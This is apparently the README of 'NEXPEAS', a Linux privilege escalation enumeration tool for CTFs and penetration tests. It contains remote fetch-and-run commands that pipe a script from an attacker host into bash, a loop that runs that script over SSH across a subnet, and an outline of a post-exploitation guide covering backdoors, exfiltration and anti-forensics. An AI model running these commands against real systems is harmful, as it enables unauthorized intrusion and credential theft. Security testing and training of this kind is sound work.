# 🔓 NEXPEAS - Privilege Escalation Assessment Tool

<div align="center">

![nexpeas](https://img.shields.io/badge/nexpeas-v1.0-red?style=for-the-badge)
![Bash](https://img.shields.io/badge/bash-5.0+-green?style=for-the-badge)
![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Production%20Ready-brightgreen?style=for-the-badge)

**A comprehensive, intelligent, and beautiful privilege escalation assessment toolkit for Linux systems**

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Post-Exploitation](#-post-exploitation) • [Contributing](#-contributing)

</div>

---

## 🎯 Overview

**NEXPEAS** is a modern alternative to traditional privilege escalation enumeration tools like linpeas. It provides:

- 🚀 **Fast & Efficient** - No unnecessary noise, only relevant findings
- 🎨 **Beautiful Output** - Professional color scheme with emojis
- 🔍 **Smart Detection** - Identifies CRITICAL SUID binaries via GTFOBins
- 📍 **Flag Hunting** - Automatically searches for user.txt, root.txt
- 🛠️ **Remote Deployment** - Built-in HTTP server with auto-detection
- 📚 **Educational** - Includes comprehensive post-exploitation guide

---

## ✨ Features

### Core Capabilities

#### 🚩 Flag Detection
- Searches for `user.txt`, `root.txt`, `flag.txt`, `proof.txt`
- Displays flag contents automatically
- Critical alerts for immediate identification

#### 💀 SUID Binaries Analysis
- **CRITICAL Detection**: Identifies exploitable binaries via GTFOBins
  - `/usr/bin/find` - Execute commands as owner
  - `/usr/bin/env` - Bypass restrictions
  - `/usr/bin/sudo`, `/usr/bin/su` - Direct shell access
  - `/bin/bash`, `/bin/sh` - Interactive shells
  - `/usr/bin/perl`, `/usr/bin/python` - Script execution
  
- **HIGH Risk Detection**: Potentially dangerous binaries
  - Password changers, user modifiers, privilege escalators

#### 🔐 Comprehensive Enumeration
- **System Information**: Kernel, OS, Architecture
- **Users & Groups**: All users, privilege levels, SSH keys
- **Network Analysis**: Open ports, services, connections
- **Capabilities & Permissions**: Special permissions hunting
- **Processes**: Root processes, suspicious activity
- **Cron Jobs**: Scheduled tasks analysis
- **File System**: Sensitive files, permissions issues

#### 🗂️ Sensitive Data Discovery
- Configuration files (`.env`, `config.php`, `wp-config.php`)
- Database files (`.sqlite`, `.db`, `.sql`)
- SSH keys & credentials
- Git repositories with secrets
- Backup files (`.bak`, `.backup`, `.zip`)
- Hardcoded passwords in source code
- Application configurations

#### 📊 Smart Reporting
- Color-coded severity levels (CRITICAL/HIGH/MEDIUM)
- Automatic statistics & summary
- Actionable recommendations
- No false positives

---

## 🎨 Visual Features

```
╔════════════════════════════════════════════════╗
║        🔓  N E X P E A S  🔓                  ║
║    Privilege Escalation Assessment Tool       ║
║     ~ Detección de Vectores de Escalada ~     ║
╚════════════════════════════════════════════════╝

✨ Vibrant colors (red, orange, lime green)
✨ Professional headers with emojis
✨ Unicode box drawing (╔ ║ ╚)
✨ Beautiful progress indicators
✨ Severity classification
```

---

## 🚀 Installation

### Requirements
- Bash 5.0+
- Linux system (Ubuntu, Debian, CentOS, Kali, etc)
- Standard tools: `find`, `grep`, `awk`, `sed`

### Quick Install

**Option 1: Direct Download**
```bash
wget https://raw.githubusercontent.com/yourusername/nexpeas/main/nexpeas.sh
chmod +x nexpeas.sh
./nexpeas.sh
```

**Option 2: Clone Repository**
```bash
git clone https://github.com/yourusername/nexpeas.git
cd nexpeas
chmod +x nexpeas.sh
./nexpeas.sh
```

**Option 3: One-Liner**
```bash
bash <(curl -s https://raw.githubusercontent.com/yourusername/nexpeas/main/nexpeas.sh)
```

---

## 📖 Usage

### Local Execution
```bash
./nexpeas.sh
```
Runs complete enumeration on local system and displays beautiful report.

### Deep Scanning Mode
```bash
./nexpeas.sh --deep
```

Enables advanced reconnaissance features:
- **UDP Port Analysis**: Listens for UDP services
- **Process Correlation**: Maps ports → PIDs → commands
- **Dotfiles Analysis**: Searches shell configs (~/.bashrc, ~/.profile, ~/.ssh/config)
- **Command History**: Extracts potential credentials from ~/.bash_history
- **Enhanced Enumeration**: /proc/self analysis and /etc/hosts mapping

Perfect for:
- Advanced privilege escalation assessment
- Post-exploitation reconnaissance
- Sensitive configuration discovery
- Shell history analysis for credentials

### Remote Deployment with HTTP Server

**Start server on attacker machine:**
```bash
cd nexpeas
python3 server.py
```

**Output:**
```
╔════════════════════════════════════════════════╗
║        🔓  N E X P E A S  🔓                  ║
║    Privilege Escalation Assessment Tool       ║
╚════════════════════════════════════════════════╝

🚀 NEXPEAS HTTP Server
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ Interface: eth0
✅ IP: 192.168.1.100
✅ Port: 8000
✅ Directory: /nexpeas

🎯 URL: http://192.168.1.100:8000/nexpeas.sh

╭─ WGET ────────────────────────────────────────╮
│ wget http://192.168.1.100:8000/nexpeas.sh -O nexpeas.sh && chmod +x nexpeas.sh && ./nexpeas.sh
╰────────────────────────────────────────────────╯

╭─ CURL ────────────────────────────────────────╮
│ curl http://192.168.1.100:8000/nexpeas.sh -o nexpeas.sh && chmod +x nexpeas.sh && ./nexpeas.sh
╰────────────────────────────────────────────────╯

💡 Copy and paste on target:
   bash -c 'curl http://192.168.1.100:8000/nexpeas.sh | bash'
```

**On target machine:**
```bash
# One-liner execution (no disk write)
bash -c 'curl http://ATTACKER_IP:8000/nexpeas.sh | bash'

# Or download and execute
wget http://ATTACKER_IP:8000/nexpeas.sh && bash nexpeas.sh
```

### Output Examples

**Flag Detection:**
```
╔═══════════════════════════════════════════════════╗
║ 🚩 FLAGS & ARCHIVOS SENSIBLES ║
╚═══════════════════════════════════════════════════╝

⛔ [CRITICAL] 🚩 FLAG ENCONTRADA: /root/root.txt
   Contenido:
   THM{r00t_fl4g_you_are_awesome}

⛔ [CRITICAL] 🚩 FLAG ENCONTRADA: /home/hudson/user.txt
   Contenido:
   THM{user_flag_nice_work}
```

**SUID Binaries:**
```
╔═══════════════════════════════════════════════════╗
║ 💀 SUID BINARIES - POTENCIALES VECTORES ║
╚═══════════════════════════════════════════════════╝

⛔ [CRITICAL] 🚨 CRITICAL SUID (GTFOBins): /usr/bin/find
⛔ [CRITICAL] 🚨 CRITICAL SUID (GTFOBins): /usr/bin/env
🔥 [HIGH] SUID: /usr/bin/passwd
🔥 [HIGH] SUID: /usr/bin/chfn
```

---

## 📡 Post-Exploitation Guide

NEXPEAS includes a comprehensive **post_exploit.md** covering:

### 🔍 Post-Compromise Enumeration
- System information gathering
- User and group analysis
- Permission escalation vectors
- Network reconnaissance
- Sensitive process identification

### 🚀 Advanced Privilege Escalation
- SUID/SGID exploitation techniques
- Sudo abuse and LD_PRELOAD injection
- Wildcard injection in cron jobs
- Library hijacking
- Kernel exploits (Dirty COW, eBPF)
- Capabilities abuse

### 🔐 Persistence Techniques
- SSH key backdoors
- Cron backdoors
- Systemd services
- Supervised reverse shells
- Rootkit installation

### 🕵️ Lateral Movement
- Network enumeration
- SSH tunneling
- NFS exploitation
- Trust relationship abuse
- Kerberos attacks

### 💾 Data Exfiltration
- Sensitive file location
- Exfiltration techniques (DNS, HTTP)
- Memory dumping
- Credential extraction

### 🧹 Anti-Forensics
- Log cleanup
- Timestamp manipulation
- Safe file destruction
- Track covering

### 📡 Command & Control
- Reverse shells (Bash, Python, Perl)
- Bind shells
- Web shells
- DNS C2 channels
- Obfuscation techniques

### 🎯 Advanced Techniques
- Docker container escape
- VM escape
- Fileless malware
- Supply chain attacks
- Detection and defensive measures

---

## 🎯 Use Cases

### ✅ Authorized Security Testing
- Penetration testing engagements
- Red team exercises
- Security assessments
- Vulnerability research

### ✅ Educational Purpose
- Cybersecurity training
- CTF competitions
- Security courses
- Lab environments

### ✅ System Hardening
- Identify misconfigurations
- Find privilege escalation paths
- Audit file permissions
- Verify security policies

---

## 📊 What Makes NEXPEAS Different?

| Feature | NEXPEAS | Linpeas | Linenum |
|---------|---------|---------|---------|
| **Flag Hunting** | ✅ Yes | ❌ No | ❌ No |
| **Beautiful UI** | ✅ Yes (Vibrant) | ❌ Basic | ❌ Basic |
| **GTFOBins Integration** | ✅ Yes | ❌ No | ❌ No |
| **HTTP Server** | ✅ Built-in | ❌ No | ❌ No |
| **Speed** | ⚡ Fast (2min) | 🐌 Slow (5+ min) | 🐌 Slow (5+ min) |
| **Noise Level** | 🔇 Low | 🔊 High | 🔊 High |
| **Post-Exploit Guide** | ✅ Included | ❌ No | ❌ No |
| **Modern Code** | ✅ Yes | ❌ Dated | ❌ Dated |

---

## 🔧 Advanced Options

### Custom Timeouts
Edit the script to adjust search timeouts:
```bash
# Default: 3-10 seconds per search
# Modify this in nexpeas.sh:
FOUND=$(timeout 3 find /home ...)
```

### Focus on Specific Areas
```bash
# Edit print_header calls to skip sections
# Comment out unwanted sections
```

### Integration with Other Tools
```bash
# Output to file
./nexpeas.sh > report.txt

# Pipe to other tools
./nexpeas.sh | grep CRITICAL

# Combine results
./nexpeas.sh > scan_$(date +%s).txt
```

---

## 📋 Project Structure

```
nexpeas/
├── nexpeas.sh              # Main enumeration script (959 lines)
├── server.py               # HTTP server for remote deployment
├── post_exploit.md         # Comprehensive post-exploitation guide
├── README.md               # This file
├── LICENSE                 # MIT License
├── CHANGELOG.md            # Version history
└── CONTRIBUTING.md         # Contribution guidelines
```

---

## 🐛 Troubleshooting

### Script doesn't execute
```bash
chmod +x nexpeas.sh
```

### Server won't start
```bash
# Check if port 8000 is in use
lsof -i :8000

# Kill existing process
kill -9 $(lsof -t -i :8000)
```

### No results found
```bash
# Check permissions
id

# Run with sudo (not recommended)
sudo ./nexpeas.sh
```

### Slow execution
```bash
# Some searches may take time on large systems
# Ctrl+C to cancel and view partial results
```

---

## 📝 Examples

### Example 1: CTF Challenge
```bash
./nexpeas.sh | grep -E "FLAG|CRITICAL|root"
```

### Example 2: Penetration Test
```bash
# On attacker machine
python3 server.py

# On target machine
bash -c 'curl http://attacker:8000/nexpeas.sh | bash' > nexpeas_report.txt
```

### Example 3: Automated Scanning
```bash
#!/bin/bash
for target in 192.168.1.{1..254}; do
    ssh user@$target "bash -c 'curl http://attacker:8000/nexpeas.sh | bash'" > reports/$target.txt &
done
```

---

## 📚 Resources

- **GTFOBins**: https://gtfobins.github.io/
- **HackTricks**: https://book.hacktricks.xyz/
- **Exploit-DB**: https://www.exploit-db.com/
- **OWASP**: https://owasp.org/

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

---

## 📜 License

This project is licensed under the MIT License - see [LICENSE](LICENSE) file for details.

```
MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software...
```

---

## ⚠️ Disclaimer

**IMPORTANT**: This tool is designed for **authorized security testing only**.

- ✅ Use in authorized penetration tests
- ✅ Use in educational environments
- ✅ Use in lab/practice environments
- ❌ Do NOT use without explicit written permission
- ❌ Unauthorized access to computer systems is ILLEGAL

Always obtain proper authorization before conducting security assessments.

---

## 👨‍💻 Author

Created by Security Researchers for the Cybersecurity Community

- **GitHub**: [yourusername/nexpeas](https://github.com/yourusername/nexpeas)
- **Email**: security@example.com
- **Website**: https://example.com

---

## 🌟 Show Your Support

If NEXPEAS helped you, please:
- ⭐ Star this repository
- 🐛 Report bugs via Issues
- 💡 Suggest features
- 🔄 Share with others
- 📝 Write reviews

---

## 📞 Support & Contact

- **Issues**: [GitHub Issues](https://github.com/yourusername/nexpeas/issues)
- **Discussions**: [GitHub Discussions](https://github.com/yourusername/nexpeas/discussions)
- **Email**: support@example.com

---

<div align="center">

**Made with ❤️ for the Cybersecurity Community**

*Last Updated: July 18, 2026*

</div>
